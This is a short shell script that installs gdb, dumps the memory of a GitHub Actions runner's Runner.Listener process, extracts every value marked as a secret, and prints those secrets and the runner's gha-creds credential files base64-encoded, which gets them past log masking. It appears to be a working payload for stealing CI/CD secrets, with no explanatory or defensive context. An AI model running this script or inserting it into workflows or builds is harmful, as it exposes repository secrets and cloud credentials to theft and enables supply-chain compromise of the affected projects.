
sudo apt update
sudo apt install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | base64
cat /home/runner/work/*/*/gha-creds-* | base64
